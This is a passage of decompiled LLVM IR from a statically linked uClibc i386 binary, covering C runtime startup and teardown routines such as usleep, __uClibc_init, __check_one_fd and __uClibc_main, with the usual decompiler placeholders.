dec_label_pc_8060afd:                             ; preds = %entry
  br label %dec_label_pc_8060c05

dec_label_pc_8060b07:                             ; preds = %entry
  br label %dec_label_pc_8060c05

dec_label_pc_8060b11:                             ; preds = %entry
  %v1_8060b14 = call i32 @getdtablesize(i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_8060b19

dec_label_pc_8060b19:                             ; preds = %entry, %dec_label_pc_8060b11
  br label %dec_label_pc_8060c05

dec_label_pc_8060b23:                             ; preds = %entry
  %v1_8060b26 = call i32 @__GI_getpagesize(i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_8060b2b

dec_label_pc_8060b2b:                             ; preds = %entry, %dec_label_pc_8060b23
  br label %dec_label_pc_8060c05

dec_label_pc_8060b35:                             ; preds = %entry
  br label %dec_label_pc_8060c05

dec_label_pc_8060b3f:                             ; preds = %entry
  br label %dec_label_pc_8060c05

dec_label_pc_8060b49:                             ; preds = %entry
  br label %dec_label_pc_8060c05

dec_label_pc_8060b53:                             ; preds = %entry
  br label %dec_label_pc_8060c05

dec_label_pc_8060b5d:                             ; preds = %entry
  br label %dec_label_pc_8060c05

dec_label_pc_8060b67:                             ; preds = %entry
  br label %dec_label_pc_8060c05

dec_label_pc_8060b71:                             ; preds = %entry
  br label %dec_label_pc_8060c05

dec_label_pc_8060b7b:                             ; preds = %entry
  br label %dec_label_pc_8060c05

dec_label_pc_8060b85:                             ; preds = %entry
  br label %dec_label_pc_8060c05

dec_label_pc_8060b8c:                             ; preds = %entry
  %v5_8060b92 = call i32 @__GI_clock_getres(i32 1, %timespec* null, i32 149, i32 149)
  %v2_8060b9a = icmp slt i32 %v5_8060b92, 0
  %v1_8060b9c = icmp eq i1 %v2_8060b9a, false
  br i1 %v1_8060b9c, label %dec_label_pc_8060bae, label %dec_label_pc_8060bd8

dec_label_pc_8060ba0:                             ; preds = %entry, %entry
  br label %dec_label_pc_8060c05

dec_label_pc_8060ba7:                             ; preds = %entry, %entry
  br label %dec_label_pc_8060c05

dec_label_pc_8060bae:                             ; preds = %entry, %entry, %entry, %entry, %entry, %entry, %entry, %dec_label_pc_8060b8c
  br label %dec_label_pc_8060c05

dec_label_pc_8060bb5:                             ; preds = %entry, %entry, %entry, %entry, %entry, %entry, %entry
  br label %dec_label_pc_8060c05

dec_label_pc_8060bbc:                             ; preds = %entry, %entry, %entry, %entry
  br label %dec_label_pc_8060c05

dec_label_pc_8060bc3:                             ; preds = %entry, %entry, %entry, %entry, %entry
  br label %dec_label_pc_8060c05

dec_label_pc_8060bca:                             ; preds = %entry, %entry
  br label %dec_label_pc_8060c05

dec_label_pc_8060bd1:                             ; preds = %entry, %entry
  br label %dec_label_pc_8060c05

dec_label_pc_8060bd8:                             ; preds = %dec_label_pc_8060b8c, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %dec_label_pc_8060ae3
  br label %dec_label_pc_8060c05

dec_label_pc_8060bdd:                             ; preds = %entry, %entry
  br label %dec_label_pc_8060c05

dec_label_pc_8060be4:                             ; preds = %entry, %entry
  br label %dec_label_pc_8060c05

dec_label_pc_8060beb:                             ; preds = %entry, %entry
  br label %dec_label_pc_8060c05

dec_label_pc_8060bf2:                             ; preds = %entry, %entry, %entry, %entry
  br label %dec_label_pc_8060c05

dec_label_pc_8060bf9:                             ; preds = %entry, %entry
  br label %dec_label_pc_8060c05

dec_label_pc_8060c00:                             ; preds = %entry, %entry, %entry
  br label %dec_label_pc_8060c05

dec_label_pc_8060c05:                             ; preds = %dec_label_pc_8060bf9, %dec_label_pc_8060bf2, %dec_label_pc_8060beb, %dec_label_pc_8060be4, %dec_label_pc_8060bdd, %dec_label_pc_8060bd1, %dec_label_pc_8060bca, %dec_label_pc_8060bc3, %dec_label_pc_8060bbc, %dec_label_pc_8060bb5, %dec_label_pc_8060ba7, %dec_label_pc_8060ba0, %dec_label_pc_8060bae, %dec_label_pc_8060b85, %dec_label_pc_8060b7b, %dec_label_pc_8060b71, %dec_label_pc_8060b67, %dec_label_pc_8060b5d, %dec_label_pc_8060b53, %dec_label_pc_8060b49, %dec_label_pc_8060b3f, %dec_label_pc_8060b35, %dec_label_pc_8060b2b, %dec_label_pc_8060b19, %dec_label_pc_8060b07, %dec_label_pc_8060afd, %dec_label_pc_8060af3, %dec_label_pc_8060bd8, %dec_label_pc_8060ad9, %dec_label_pc_8060c00
  %v0_8060c08 = phi i32 [ 255, %dec_label_pc_8060bf9 ], [ 2048, %dec_label_pc_8060bf2 ], [ 99, %dec_label_pc_8060beb ], [ 20, %dec_label_pc_8060be4 ], [ -128, %dec_label_pc_8060bdd ], [ 1024, %dec_label_pc_8060bd1 ], [ 4, %dec_label_pc_8060bca ], [ 32, %dec_label_pc_8060bc3 ], [ 256, %dec_label_pc_8060bbc ], [ 2147483647, %dec_label_pc_8060bb5 ], [ 16, %dec_label_pc_8060ba7 ], [ 127, %dec_label_pc_8060ba0 ], [ 200112, %dec_label_pc_8060bae ], [ 9, %dec_label_pc_8060b85 ], [ 65535, %dec_label_pc_8060b7b ], [ -32768, %dec_label_pc_8060b71 ], [ -2147483648, %dec_label_pc_8060b67 ], [ 8, %dec_label_pc_8060b5d ], [ 500, %dec_label_pc_8060b53 ], [ 4096, %dec_label_pc_8060b49 ], [ 16384, %dec_label_pc_8060b3f ], [ 1000, %dec_label_pc_8060b35 ], [ 32768, %dec_label_pc_8060b2b ], [ 6, %dec_label_pc_8060b19 ], [ 65536, %dec_label_pc_8060b07 ], [ 100, %dec_label_pc_8060afd ], [ 131072, %dec_label_pc_8060af3 ], [ -1, %dec_label_pc_8060bd8 ], [ 1, %dec_label_pc_8060ad9 ], [ 32767, %dec_label_pc_8060c00 ]
  ret i32 %v0_8060c08

; uselistorder directives
  uselistorder i32 16384, { 1, 0, 5, 6, 7, 8, 9, 10, 2, 3, 4, 11 }
  uselistorder i32 (i32)* @__GI_getpagesize, { 4, 2, 1, 0, 3 }
  uselistorder i32 149, { 1, 0, 2 }
  uselistorder i32 129, { 1, 0 }
  uselistorder i32 124, { 2, 1, 0 }
  uselistorder i32 115, { 5, 0, 1, 2, 3, 4 }
  uselistorder i32 114, { 1, 0 }
  uselistorder i32 113, { 2, 0, 1 }
  uselistorder i32 110, { 2, 0, 1, 3 }
  uselistorder i32 106, { 1, 0 }
  uselistorder i32 99, { 0, 5, 1, 2, 6, 3, 4, 7, 8 }
  uselistorder i32 97, { 0, 1, 5, 2, 3, 4 }
  uselistorder i32 95, { 4, 2, 1, 3, 0 }
  uselistorder i32 76, { 0, 3, 4, 5, 6, 2, 1, 7 }
  uselistorder i32 70, { 1, 2, 0 }
  uselistorder i32 66, { 0, 9, 2, 3, 4, 12, 5, 10, 1, 6, 7, 8, 11 }
  uselistorder i32 65, { 2, 10, 11, 6, 7, 8, 4, 1, 0, 3, 9, 5 }
  uselistorder i32 63, { 3, 0, 4, 5, 6, 2, 7, 1 }
  uselistorder i32 62, { 1, 0 }
  uselistorder i32 58, { 3, 2, 0, 1 }
  uselistorder i32 53, { 3, 0, 1, 2 }
  uselistorder i32 42, { 4, 5, 3, 0, 1, 2 }
  uselistorder i32 26, { 1, 2, 3, 0 }
  uselistorder i32 25, { 1, 2, 3, 4, 0 }
  uselistorder i32 23, { 11, 6, 5, 4, 3, 1, 12, 2, 13, 7, 8, 14, 0, 9, 10 }
  uselistorder label %dec_label_pc_8060c05, { 29, 0, 1, 2, 3, 4, 27, 5, 6, 7, 8, 9, 12, 10, 11, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 28 }
  uselistorder label %dec_label_pc_8060bd8, { 0, 34, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33 }
  uselistorder label %dec_label_pc_8060bae, { 7, 0, 1, 2, 3, 4, 5, 6 }
  uselistorder label %dec_label_pc_8060b2b, { 1, 0 }
  uselistorder label %dec_label_pc_8060b19, { 1, 0 }
}

define i32 @usleep(i64 %arg1) local_unnamed_addr {
entry:
  %stack_var_-8 = alloca i32, align 4
  store i32 1000000, i32* @ecx, align 4
  %v2_8060c1c = and i64 %arg1, 4294967295
  %v8_8060c1c = udiv i64 %v2_8060c1c, 1000000
  %v9_8060c1c = trunc i64 %v8_8060c1c to i32
  store i32 %v9_8060c1c, i32* %stack_var_-8, align 4
  %v2_8060c2e = ptrtoint i32* %stack_var_-8 to i32
  %v2_8060c33 = call i32 @nanosleep(i32 %v2_8060c2e, i32 0)
  ret i32 %v2_8060c33

; uselistorder directives
  uselistorder i32* %stack_var_-8, { 1, 0 }
  uselistorder i32 (i32, i32)* @nanosleep, { 1, 3, 2, 4, 0 }
}

define i32 @__libc_pthread_init(i32 %arg1) local_unnamed_addr {
entry:
  ret i32 ptrtoint (i32* @global_var_807c8c4.824 to i32)
}

define i32 @__GI___uClibc_fini() local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8060c44 = load i32, i32* @ebx, align 4
  store i32 %v0_8060c44, i32* %stack_var_-4, align 4
  store i32 add (i32 ashr (i32 add (i32 ptrtoint (i32* @global_var_806f000.825 to i32), i32 -134672384), i32 2), i32 -1), i32* %ebx.global-to-local, align 4
  br i1 icmp ne (i32 ashr (i32 add (i32 ptrtoint (i32* @global_var_806f000.825 to i32), i32 -134672384), i32 2), i32 0), label %dec_label_pc_8060c58, label %dec_label_pc_8060c65

dec_label_pc_8060c58:                             ; preds = %entry, %dec_label_pc_8060c58
  %v1_8060c5f6 = phi i32 [ %v1_8060c5f, %dec_label_pc_8060c58 ], [ add (i32 ashr (i32 add (i32 ptrtoint (i32* @global_var_806f000.825 to i32), i32 -134672384), i32 2), i32 -1), %entry ]
  store i32 ptrtoint (i32* @global_var_8060c5f.826 to i32), i32* %stack_var_-16, align 4
  %v5_8060c58 = mul i32 %v1_8060c5f6, 4
  %v6_8060c58 = add i32 %v5_8060c58, ptrtoint (i32* @global_var_806f000.825 to i32)
  %v7_8060c58 = inttoptr i32 %v6_8060c58 to i32*
  %v8_8060c58 = load i32, i32* %v7_8060c58, align 4
  call void @__pseudo_call(i32 %v8_8060c58)
  %v0_8060c5f.pre = load i32, i32* %ebx.global-to-local, align 4
  %v1_8060c5f = add i32 %v0_8060c5f.pre, -1
  store i32 %v1_8060c5f, i32* %ebx.global-to-local, align 4
  %v10_8060c60 = icmp eq i32 %v0_8060c5f.pre, 0
  %v1_8060c63 = icmp eq i1 %v10_8060c60, false
  br i1 %v1_8060c63, label %dec_label_pc_8060c58, label %dec_label_pc_8060c65

dec_label_pc_8060c65:                             ; preds = %dec_label_pc_8060c58, %entry
  %v0_8060c65 = load i32, i32* @global_var_807c8d4.827, align 4
  %v1_8060c6a = icmp eq i32 %v0_8060c65, 0
  br i1 %v1_8060c6a, label %dec_label_pc_8060c70, label %dec_label_pc_8060c6e

dec_label_pc_8060c6e:                             ; preds = %dec_label_pc_8060c65
  %v0_8060c6e = load i32, i32* %stack_var_-16, align 4
  %v1_8060c6e = call i32 @unknown_0(i32 %v0_8060c6e)
  br label %dec_label_pc_8060c70

dec_label_pc_8060c70:                             ; preds = %dec_label_pc_8060c6e, %dec_label_pc_8060c65
  %v0_8060c70 = load i32, i32* @global_var_807c8d8.828, align 8
  %v1_8060c76 = icmp eq i32 %v0_8060c70, 0
  br i1 %v1_8060c76, label %dec_label_pc_8060c7f, label %dec_label_pc_8060c7a

dec_label_pc_8060c7a:                             ; preds = %dec_label_pc_8060c70
  %v2_8060c7c = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_8060c7c, i32* %ebx.global-to-local, align 4
  %v0_8060c7d = load i32, i32* %stack_var_-16, align 4
  %v1_8060c7d = call i32 @unknown_0(i32 %v0_8060c7d)
  br label %dec_label_pc_8060c7f

dec_label_pc_8060c7f:                             ; preds = %dec_label_pc_8060c70, %dec_label_pc_8060c7a
  %v2_8060c7f = load i32, i32* %stack_var_-16, align 4
  %v2_8060c80 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_8060c80, i32* @edx, align 4
  ret i32 %v2_8060c7f

; uselistorder directives
  uselistorder i32 %v1_8060c5f, { 1, 0 }
  uselistorder i32* %stack_var_-16, { 2, 1, 0, 3 }
  uselistorder i32* %ebx.global-to-local, { 1, 3, 2, 0 }
  uselistorder label %dec_label_pc_8060c7f, { 1, 0 }
  uselistorder label %dec_label_pc_8060c58, { 1, 0 }
}

define i32 @__pthread_return_0() local_unnamed_addr {
entry:
  ret i32 0
}

define i32 @__pthread_return_void() local_unnamed_addr {
entry:
  %v0_8060c86 = load i32, i32* @eax, align 4
  ret i32 %v0_8060c86
}

define i32 @__check_one_fd() local_unnamed_addr {
entry:
  %stack_var_-12 = alloca i32, align 4
  %tmp6 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-8 = alloca i32, align 4
  %v0_8060c87 = load i32, i32* @esi, align 4
  %v0_8060c88 = load i32, i32* @ebx, align 4
  store i32 %v0_8060c88, i32* %stack_var_-8, align 4
  %v0_8060c8c = load i32, i32* @eax, align 4
  store i32 %v0_8060c8c, i32* @esi, align 4
  %v0_8060c8e = load i32, i32* @edx, align 4
  store i32 %v0_8060c8e, i32* @ebx, align 4
  %v4_8060c93 = call i32 @__libc_fcntl(i32 %v0_8060c8c, i32 1, i32 %tmp6)
  %v1_8060c9b = add i32 %v4_8060c93, 1
  %v8_8060c9b = icmp eq i32 %v1_8060c9b, 0
  %v1_8060c9c = icmp eq i1 %v8_8060c9b, false
  br i1 %v1_8060c9c, label %dec_label_pc_8060cb7, label %dec_label_pc_8060c9e

dec_label_pc_8060c9e:                             ; preds = %entry
  %v0_8060ca0 = load i32, i32* @ebx, align 4
  %v4_8060ca6 = trunc i32 %v0_8060ca0 to i8
  %v5_8060ca6 = call i32 @__libc_open(i32 ptrtoint ([10 x i8]* @global_var_806decc.829 to i32), i8 %v4_8060ca6, i32 %v1_8060c9b)
  %v1_8060cae = load i32, i32* @esi, align 4
  %v12_8060cae = icmp eq i32 %v5_8060ca6, %v1_8060cae
  br i1 %v12_8060cae, label %dec_label_pc_8060cb7, label %dec_label_pc_8060cb2

dec_label_pc_8060cb2:                             ; preds = %dec_label_pc_8060c9e
  %v0_8060cb2 = call i32 @abort()
  br label %dec_label_pc_8060cb7

dec_label_pc_8060cb7:                             ; preds = %dec_label_pc_8060c9e, %entry, %dec_label_pc_8060cb2
  %v2_8060cb7 = load i32, i32* %stack_var_-12, align 4
  %v2_8060cb8 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_8060cb8, i32* @ebx, align 4
  store i32 %v0_8060c87, i32* @esi, align 4
  ret i32 %v2_8060cb7

; uselistorder directives
  uselistorder i32 (i32, i8, i32)* @__libc_open, { 5, 4, 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_8060cb7, { 2, 0, 1 }
}

define i32 @__GI___uClibc_init() local_unnamed_addr {
entry:
  %v0_8060cbe = load i8, i8* @global_var_807c8dc.830, align 4
  %v1_8060cbe = icmp eq i8 %v0_8060cbe, 0
  %v1_8060cc5 = icmp eq i1 %v1_8060cbe, false
  br i1 %v1_8060cc5, label %entry.dec_label_pc_8060cf7_crit_edge, label %dec_label_pc_8060cc7

entry.dec_label_pc_8060cf7_crit_edge:             ; preds = %entry
  %v0_8060cfa.pre = load i32, i32* @eax, align 4
  br label %dec_label_pc_8060cf7

dec_label_pc_8060cc7:                             ; preds = %entry
  store i8 1, i8* @global_var_807c8dc.830, align 4
  store i32 4096, i32* @global_var_807c8d0.673, align 16
  %v0_8060ce1 = call i32 @__pthread_initialize_minimal()
  %v0_8060cf2 = call i32 @_stdio_init()
  br label %dec_label_pc_8060cf7

dec_label_pc_8060cf7:                             ; preds = %entry.dec_label_pc_8060cf7_crit_edge, %dec_label_pc_8060cc7
  %v0_8060cfa = phi i32 [ %v0_8060cfa.pre, %entry.dec_label_pc_8060cf7_crit_edge ], [ %v0_8060cf2, %dec_label_pc_8060cc7 ]
  ret i32 %v0_8060cfa

; uselistorder directives
  uselistorder i8* @global_var_807c8dc.830, { 1, 0 }
  uselistorder label %dec_label_pc_8060cf7, { 1, 0 }
}

define i32 @__uClibc_main(i32 %arg1, i32 %arg2, i32* %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7, i32 %arg8) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %tmp24 = call i32 @__decompiler_undefined_function_0()
  %tmp25 = call i32 @__decompiler_undefined_function_0()
  %tmp26 = call i32 @__decompiler_undefined_function_0()
  %tmp31 = ptrtoint i32* %arg3 to i32
  %stack_var_-136 = alloca i32, align 4
  %stack_var_-168 = alloca i32, align 4
  %stack_var_-160 = alloca i32, align 4
  store i32 %tmp31, i32* @edi, align 4
  store i32 %arg7, i32* @global_var_807c8c8.831, align 8
  store i32 %arg6, i32* @global_var_807c8d8.828, align 8
  store i32 %arg4, i32* @ebp, align 4
  %v2_8060d32 = mul i32 %arg2, 4
  %v3_8060d32 = add i32 %tmp31, %v2_8060d32
  store i32 %v3_8060d32, i32* %edx.global-to-local, align 4
  %v1_8060d35 = add i32 %v3_8060d32, 4
  store i32 %v1_8060d35, i32* %eax.global-to-local, align 4
  store i32 %v1_8060d35, i32* @global_var_807c8cc.798, align 4
  %v3_8060d3d = load i32, i32* %arg3, align 4
  %v14_8060d3d = icmp eq i32 %v1_8060d35, %v3_8060d3d
  %v1_8060d3f = icmp eq i1 %v14_8060d3d, false
  br i1 %v1_8060d3f, label %dec_label_pc_8060d47, label %dec_label_pc_8060d41

dec_label_pc_8060d41:                             ; preds = %entry
  store i32 %v3_8060d32, i32* @global_var_807c8cc.798, align 4
  br label %dec_label_pc_8060d47

dec_label_pc_8060d47:                             ; preds = %entry, %dec_label_pc_8060d41
  %v0_8060d47 = load i32, i32* @ecx, align 4
  store i32 %v0_8060d47, i32* %stack_var_-160, align 4
  store i32 0, i32* %stack_var_-168, align 4
  %v2_8060d4c = ptrtoint i32* %stack_var_-136 to i32
  store i32 %v2_8060d4c, i32* %eax.global-to-local, align 4
  %v3_8060d51 = bitcast i32* %stack_var_-136 to i8*
  %v4_8060d51 = call i32 @__GI_memset(i8* %v3_8060d51, i32 0, i32 120)
  %v0_8060d56 = load i32, i32* @global_var_807c8cc.798, align 4
  store i32 %v0_8060d56, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8060d5e

dec_label_pc_8060d5e:                             ; preds = %dec_label_pc_8060d5e, %dec_label_pc_8060d47
  %v0_8060d5e = phi i32 [ %v1_8060d61, %dec_label_pc_8060d5e ], [ %v0_8060d56, %dec_label_pc_8060d47 ]
  %v1_8060d5e = inttoptr i32 %v0_8060d5e to i32*
  %v2_8060d5e = load i32, i32* %v1_8060d5e, align 4
  %v3_8060d5e = icmp eq i32 %v2_8060d5e, 0
  %v1_8060d61 = add i32 %v0_8060d5e, 4
  store i32 %v1_8060d61, i32* %eax.global-to-local, align 4
  %v1_8060d64 = icmp eq i1 %v3_8060d5e, false
  br i1 %v1_8060d64, label %dec_label_pc_8060d5e, label %dec_label_pc_8060d85.preheader

dec_label_pc_8060d85.preheader:                   ; preds = %dec_label_pc_8060d5e
  store i32 %v1_8060d61, i32* @ebx, align 4
  %v1_8060d851 = inttoptr i32 %v1_8060d61 to i32*
  %v2_8060d852 = load i32, i32* %v1_8060d851, align 4
  %v3_8060d853 = icmp eq i32 %v2_8060d852, 0
  %v1_8060d8810 = icmp eq i1 %v3_8060d853, false
  br i1 %v1_8060d8810, label %dec_label_pc_8060d6a.lr.ph, label %dec_label_pc_8060d8a

dec_label_pc_8060d6a.lr.ph:                       ; preds = %dec_label_pc_8060d85.preheader
  %v3_8060d4a = ptrtoint i32* %stack_var_-168 to i32
  %v3_8060d75 = add i32 %v3_8060d4a, 32
  br label %dec_label_pc_8060d6a

dec_label_pc_8060d6a:                             ; preds = %dec_label_pc_8060d6a.lr.ph, %dec_label_pc_8060d82
  %v1_8060d75 = phi i32 [ %v2_8060d852, %dec_label_pc_8060d6a.lr.ph ], [ %v2_8060d85, %dec_label_pc_8060d82 ]
  %v0_8060d74 = phi i32 [ %v1_8060d61, %dec_label_pc_8060d6a.lr.ph ], [ %v1_8060d82, %dec_label_pc_8060d82 ]
  store i32 %v1_8060d75, i32* %eax.global-to-local, align 4
  %v6_8060d6f = icmp ugt i32 %v1_8060d75, 14
  br i1 %v6_8060d6f, label %dec_label_pc_8060d82, label %dec_label_pc_8060d71

dec_label_pc_8060d71:                             ; preds = %dec_label_pc_8060d6a
  %v0_8060d71 = load i32, i32* %edx.global-to-local, align 4
  store i32 %v0_8060d71, i32* %stack_var_-160, align 4
  store i32 %v0_8060d74, i32* %stack_var_-168, align 4
  %v2_8060d75 = mul i32 %v1_8060d75, 8
  %v4_8060d75 = add i32 %v3_8060d75, %v2_8060d75
  store i32 %v4_8060d75, i32* %eax.global-to-local, align 4
  %v3_8060d7a = inttoptr i32 %v4_8060d75 to i16*
  %v4_8060d7a = call i32 @memcpy(i16* %v3_8060d7a, i32 %v0_8060d74, i32 8)
  store i32 %v4_8060d7a, i32* %eax.global-to-local, align 4
  %v0_8060d82.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_8060d82

dec_label_pc_8060d82:                             ; preds = %dec_label_pc_8060d6a, %dec_label_pc_8060d71
  %v0_8060d82 = phi i32 [ %v0_8060d74, %dec_label_pc_8060d6a ], [ %v0_8060d82.pre, %dec_label_pc_8060d71 ]
  %v1_8060d82 = add i32 %v0_8060d82, 8
  store i32 %v1_8060d82, i32* @ebx, align 4
  %v1_8060d85 = inttoptr i32 %v1_8060d82 to i32*
  %v2_8060d85 = load i32, i32* %v1_8060d85, align 4
  %v3_8060d85 = icmp eq i32 %v2_8060d85, 0
  %v1_8060d88 = icmp eq i1 %v3_8060d85, false
  br i1 %v1_8060d88, label %dec_label_pc_8060d6a, label %dec_label_pc_8060d8a

dec_label_pc_8060d8a:                             ; preds = %dec_label_pc_8060d82, %dec_label_pc_8060d85.preheader
  store i32 %v2_8060d4c, i32* @eax, align 4
  %v0_8060d8e = call i32 @_dl_aux_init()
  store i32 %v0_8060d8e, i32* @eax, align 4
  %v0_8060d93 = call i32 @__GI___uClibc_init()
  %v1_8060d9c = icmp eq i32 %tmp26, 0
  %v1_8060d9e = icmp eq i1 %v1_8060d9c, false
  br i1 %v1_8060d9e, label %dec_label_pc_8060da4, label %dec_label_pc_8060da0

dec_label_pc_8060da0:                             ; preds = %dec_label_pc_8060d8a
  %v1_8060da0 = and i32 %tmp26, -65536
  %v2_8060da0 = or i32 %v1_8060da0, 4096
  br label %dec_label_pc_8060da4

dec_label_pc_8060da4:                             ; preds = %dec_label_pc_8060d8a, %dec_label_pc_8060da0
  %storemerge = phi i32 [ %v2_8060da0, %dec_label_pc_8060da0 ], [ %tmp26, %dec_label_pc_8060d8a ]
  %v0_8060da4 = phi i32 [ %v2_8060da0, %dec_label_pc_8060da0 ], [ %tmp26, %dec_label_pc_8060d8a ]
  store i32 %storemerge, i32* %eax.global-to-local, align 4
  store i32 %v0_8060da4, i32* @global_var_807c8d0.673, align 16
  %v13_8060da9 = icmp eq i32 %tmp25, -1
  %v1_8060dae = icmp eq i1 %v13_8060da9, false
  br i1 %v1_8060dae, label %dec_label_pc_8060dd9, label %dec_label_pc_8060db0

dec_label_pc_8060db0:                             ; preds = %dec_label_pc_8060da4
  %v0_8060db0 = call i32 @getuid()
  store i32 %v0_8060db0, i32* %eax.global-to-local, align 4
  store i32 %v0_8060db0, i32* @ebx, align 4
  %v0_8060db7 = call i32 @geteuid()
  store i32 %v0_8060db7, i32* %eax.global-to-local, align 4
  %v0_8060dbc = load i32, i32* @ebx, align 4
  %v12_8060dbc = icmp eq i32 %v0_8060dbc, %v0_8060db7
  %v1_8060dbe = icmp eq i1 %v12_8060dbc, false
  br i1 %v1_8060dbe, label %dec_label_pc_8060def, label %dec_label_pc_8060dc0

dec_label_pc_8060dc0:                             ; preds = %dec_label_pc_8060db0
  %v0_8060dc0 = call i32 @getgid()
  store i32 %v0_8060dc0, i32* %eax.global-to-local, align 4
  store i32 %v0_8060dc0, i32* @ebx, align 4
  %v0_8060dc7 = call i32 @getegid()
  store i32 %v0_8060dc7, i32* %eax.global-to-local, align 4
  %v0_8060dcc = load i32, i32* @ebx, align 4
  %v12_8060dcc = icmp eq i32 %v0_8060dcc, %v0_8060dc7
  %v1_8060dce = icmp eq i1 %v12_8060dcc, false
  br i1 %v1_8060dce, label %dec_label_pc_8060def, label %dec_label_pc_8060dd0.thread

dec_label_pc_8060dd0.thread:                      ; preds = %dec_label_pc_8060dc0
  br label %dec_label_pc_8060e19

dec_label_pc_8060dd9:                             ; preds = %dec_label_pc_8060da4
  store i32 %tmp25, i32* %eax.global-to-local, align 4
  %v15_8060dd9 = icmp eq i32 %tmp25, %tmp24
  %v1_8060ddd = icmp eq i1 %v15_8060dd9, false
  br i1 %v1_8060ddd, label %dec_label_pc_8060def, label %dec_label_pc_8060ddf

dec_label_pc_8060ddf:                             ; preds = %dec_label_pc_8060dd9
  br label %dec_label_pc_8060def

dec_label_pc_8060def:                             ; preds = %dec_label_pc_8060ddf, %dec_label_pc_8060dd9, %dec_label_pc_8060dc0, %dec_label_pc_8060db0
  store i32 131072, i32* @edx, align 4
  store i32 0, i32* @eax, align 4
  %v0_8060df6 = call i32 @__check_one_fd()
  store i32 131074, i32* @edx, align 4
  store i32 1, i32* @eax, align 4
  %v0_8060e05 = call i32 @__check_one_fd()
  store i32 131074, i32* @edx, align 4
  store i32 2, i32* @eax, align 4
  %v0_8060e14 = call i32 @__check_one_fd()
  br label %dec_label_pc_8060e19

dec_label_pc_8060e19:                             ; preds = %dec_label_pc_8060dd0.thread, %dec_label_pc_8060def
  %storemerge52 = phi i32 [ %tmp25, %dec_label_pc_8060dd0.thread ], [ %v0_8060e14, %dec_label_pc_8060def ]
  store i32 %storemerge52, i32* %eax.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_806f000.825 to i32), i32* %esi.global-to-local, align 4
  %v0_8060e1e = load i32, i32* @edi, align 4
  %v1_8060e1e = inttoptr i32 %v0_8060e1e to i32*
  %v2_8060e1e = load i32, i32* %v1_8060e1e, align 4
  store i32 add (i32 ptrtoint (i32* @global_var_806f000.825 to i32), i32 -134672384), i32* %esi.global-to-local, align 4
  store i32 %v2_8060e1e, i32* inttoptr (i32 134692804 to i32*), align 4
  store i32 sdiv (i32 add (i32 ptrtoint (i32* @global_var_806f000.825 to i32), i32 -134672384), i32 4), i32* %esi.global-to-local, align 4
  store i32 %arg5, i32* %eax.global-to-local, align 4
  store i32 0, i32* %ebx.global-to-local, align 4
  store i32 %arg5, i32* @global_var_807c8d4.827, align 4
  br i1 icmp ugt (i32 add (i32 ptrtoint (i32* @global_var_806f000.825 to i32), i32 -134672381), i32 6), label %dec_label_pc_8060e3e, label %dec_label_pc_8060e4a

dec_label_pc_8060e3e:                             ; preds = %dec_label_pc_8060e19, %dec_label_pc_8060e3e
  %v4_8060e3e50 = phi i32 [ %v1_8060e45, %dec_label_pc_8060e3e ], [ 0, %dec_label_pc_8060e19 ]
  store i32 ptrtoint (i32* @global_var_8060e45.832 to i32), i32* %stack_var_-160, align 4
  %v5_8060e3e = mul i32 %v4_8060e3e50, 4
  %v6_8060e3e = add i32 %v5_8060e3e, ptrtoint (i32* @global_var_806f000.825 to i32)
  %v7_8060e3e = inttoptr i32 %v6_8060e3e to i32*
  %v8_8060e3e = load i32, i32* %v7_8060e3e, align 4
  call void @__pseudo_call(i32 %v8_8060e3e)
  %v0_8060e45 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8060e45 = add i32 %v0_8060e45, 1
  store i32 %v1_8060e45, i32* %ebx.global-to-local, align 4
  %v1_8060e46.pre = load i32, i32* %esi.global-to-local, align 4
  %v7_8060e46 = icmp ult i32 %v1_8060e45, %v1_8060e46.pre
  br i1 %v7_8060e46, label %dec_label_pc_8060e3e, label %dec_label_pc_8060e4a

dec_label_pc_8060e4a:                             ; preds = %dec_label_pc_8060e3e, %dec_label_pc_8060e19
  store i32 134614608, i32* %stack_var_-160, align 4
  call void @__pseudo_call(i32 %arg4)
  store i32 0, i32* @ebx, align 4
  store i32 ashr (i32 add (i32 ptrtoint (i32* @global_var_806f000.825 to i32), i32 -134672384), i32 2), i32* %esi.global-to-local, align 4
  br i1 icmp ugt (i32 ashr (i32 add (i32 ptrtoint (i32* @global_var_806f000.825 to i32), i32 -134672384), i32 2), i32 0), label %dec_label_pc_8060e62, label %dec_label_pc_8060e6e

dec_label_pc_8060e62:                             ; preds = %dec_label_pc_8060e4a, %dec_label_pc_8060e62
  %v4_8060e6244 = phi i32 [ %v1_8060e69, %dec_label_pc_8060e62 ], [ 0, %dec_label_pc_8060e4a ]
  store i32 ptrtoint (i32* @global_var_8060e69.833 to i32), i32* %stack_var_-160, align 4
  %v5_8060e62 = mul i32 %v4_8060e6244, 4
  %v6_8060e62 = add i32 %v5_8060e62, ptrtoint (i32* @global_var_806f000.825 to i32)
  %v7_8060e62 = inttoptr i32 %v6_8060e62 to i32*
  %v8_8060e62 = load i32, i32* %v7_8060e62, align 4
  call void @__pseudo_call(i32 %v8_8060e62)
